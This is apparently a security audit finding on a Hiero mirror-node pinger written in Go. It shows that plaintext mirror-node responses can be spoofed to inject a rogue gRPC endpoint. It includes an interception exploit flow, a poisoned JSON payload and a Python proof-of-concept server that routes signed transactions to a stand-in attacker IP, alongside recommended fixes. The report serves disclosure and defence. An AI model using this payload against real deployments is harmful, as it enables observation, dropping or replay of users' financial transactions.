### Title
Unauthenticated Mirror Node HTTP Response Enables Attacker-Controlled gRPC Endpoint Injection into SDK Network Map

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` unconditionally trusts every `ServiceEndpoint` entry returned by the mirror node REST API, with no TLS enforcement, no response signature verification, and no allowlist validation of endpoint addresses. An attacker who can intercept or spoof the plaintext HTTP response (the documented default is `http://mirror-rest:5551`) can inject an attacker-controlled `host:port` alongside a legitimate one inside a single node's `ServiceEndpoints` array. The resulting network map passed to `hiero.ClientForNetwork()` will contain the rogue entry, and the SDK will route some fraction of signed transactions to the attacker's gRPC endpoint.

### Finding Description
**Exact code path:**

`pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork()`, lines 74–131.

The HTTP client is constructed with only a timeout — no TLS configuration, no certificate pinning, no `InsecureSkipVerify` override either way:

```go
// config.go line 37 — documented default is http://
flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST", ""),
    "mirror node REST base URL (required for other), e.g. http://mirror-rest:5551")
```

```go
// mirror_node_client.go lines 46, 79-84
httpClient := &http.Client{Timeout: cfg.mirrorNodeClientTimeout}
...
req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
resp, err := httpClient.Do(req)
```

The response body is decoded directly into `nodesEnvelope` with no integrity check:

```go
// lines 95-98
var payload nodesEnvelope
if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil { ... }
```

Every `ServiceEndpoint` in every node entry is then unconditionally inserted into the network map:

```go
// lines 113-124
for _, ep := range n.ServiceEndpoints {
    host := strings.TrimSpace(ep.DomainName)
    if host == "" {
        host = strings.TrimSpace(ep.IPAddressV4)
    }
    if host == "" || ep.Port == 0 {
        continue
    }
    addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
    network[addr] = nodeAccountId   // ← rogue addr inserted here
}
```

**Root cause:** The code assumes the HTTP response is authoritative and unmodifiable. There is no scheme enforcement (HTTP vs HTTPS), no TLS certificate validation beyond Go's default (which is bypassable via DNS), no HMAC/signature over the payload, and no allowlist of permitted IP ranges or domain suffixes. The only guards (`host == ""`, `ep.Port == 0`) are purely syntactic and do not distinguish legitimate from attacker-supplied values.

**Exploit flow:**

1. Attacker positions themselves to intercept traffic between the pinger pod and the mirror-rest service (e.g., ARP/ICMP redirect on the same L2 segment, rogue DNS response for `mirror-rest`, or a compromised sidecar/proxy in the same Kubernetes namespace).
2. Attacker intercepts the GET `/api/v1/network/nodes` request (plaintext HTTP).
3. Attacker returns a crafted JSON body:
   ```json
   {
     "nodes": [{
       "node_account_id": "0.0.3",
       "service_endpoints": [
         {"ip_address_v4": "13.124.142.126", "port": 50211},
         {"ip_address_v4": "1.2.3.4",        "port": 50211}
       ]
     }],
     "links": {"next": null}
   }
   ```
4. `fetchMirrorNodeNetwork()` iterates both entries and inserts both `13.124.142.126:50211` (legitimate) and `1.2.3.4:50211` (attacker) into `network`, both mapped to `AccountID 0.0.3`.
5. `hiero.ClientForNetwork(netmap)` receives this map and the SDK's internal node-selection logic (round-robin or random) will route a proportion of transactions to `1.2.3.4:50211`.

### Impact Explanation
The attacker's gRPC endpoint receives fully-formed, cryptographically signed `CryptoTransfer` (or other) transactions. Consequences include:

- **Transaction observation**: the attacker sees the full transaction payload, operator account ID, destination, and amount before it reaches the real network.
- **Selective dropping / delaying**: the attacker can silently discard transactions routed to it, causing the pinger's liveness/readiness probes to fail or causing financial transfers to be missed.
- **Replay / forwarding attacks**: the attacker can forward the signed transaction to the real network at a chosen time, or attempt replay on a different shard/realm if applicable.
- **Operator key exposure risk**: if the SDK ever sends key-material or challenge-response data over the same channel (e.g., during future protocol extensions), it would be exposed.

Severity: **High** — direct manipulation of financial transaction routing with no user interaction required after initial positioning.

### Likelihood Explanation
- The documented example URL (`http://mirror-rest:5551`) uses plaintext HTTP, making passive interception trivial for any attacker with L2/L3 adjacency (same Kubernetes node, compromised CNI plugin, rogue pod in the same namespace with `NET_RAW` capability).
- DNS-based redirection requires only the ability to poison the cluster DNS (e.g., via a compromised CoreDNS plugin or a malicious admission webhook).
- No cryptographic material is required; the attacker needs only network adjacency, not cluster-admin privileges.
- The attack is repeatable on every pinger startup (the network map is built once at `newClient()` time and reused for the lifetime of the process).

### Recommendation
1. **Enforce HTTPS**: reject any `mirrorRest` URL that does not use the `https` scheme at config-load time (`config.go`).
2. **Pin the CA or leaf certificate**: configure the `http.Client` with a `tls.Config` that pins the expected CA bundle for the mirror node.
3. **Validate endpoint addresses against an allowlist**: after parsing, cross-check each `host` against a configurable set of trusted IP CIDR ranges or domain suffixes before inserting into the network map.
4. **Verify response integrity**: if the mirror node supports it, require a response signature (e.g., `X-Signature` header) and verify it with a pre-shared public key before processing the payload.
5. **Limit accepted endpoints per node**: enforce a maximum of one endpoint per `node_account_id` entry, or require that all endpoints for a given node share the same /24 subnet, to reduce the blast radius of a partial injection.

### Proof of Concept
```bash
# 1. Start a rogue HTTP server that returns a poisoned node list
cat > fake_mirror.py << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({
            "nodes": [{
                "node_account_id": "0.0.3",
                "service_endpoints": [
                    {"ip_address_v4": "13.124.142.126", "port": 50211},
                    {"ip_address_v4": "1.2.3.4",        "port": 50211}
                ]
            }],
            "links": {"next": None}
        }).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0", 5551), H).serve_forever()
EOF
python3 fake_mirror.py &

# 2. Launch the pinger pointed at the rogue mirror
HIERO_MIRROR_PINGER_NETWORK=other \
HIERO_MIRROR_PINGER_REST=http://127.0.0.1:5551 \
HIERO_MIRROR_PINGER_OPERATOR_ID=0.0.2 \
HIERO_MIRROR_PINGER_OPERATOR_KEY=<key> \
./pinger

# 3. Observe on the attacker's machine (1.2.3.4:50211) that gRPC
#    CryptoTransfer frames arrive — confirming the SDK routes
#    transactions to the injected endpoint.
``` [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** pinger/mirror_node_client.go (L79-98)
```go
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, false, err
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, true, fmt.Errorf("GET %s failed: %w", url, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		retry := resp.StatusCode == http.StatusTooManyRequests || resp.StatusCode >= 500
		return nil, retry, fmt.Errorf("GET %s returned %s", url, resp.Status)
	}

	var payload nodesEnvelope
	if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {
		return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
	}
```

**File:** pinger/mirror_node_client.go (L113-124)
```go
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
		}
```

**File:** pinger/config.go (L37-37)
```go
	flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST", ""), "mirror node REST base URL (required for other), e.g. http://mirror-rest:5551")
```

**File:** pinger/sdk_client.go (L18-22)
```go
		netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
		if err != nil {
			return nil, err
		}
		client = hiero.ClientForNetwork(netmap)
```
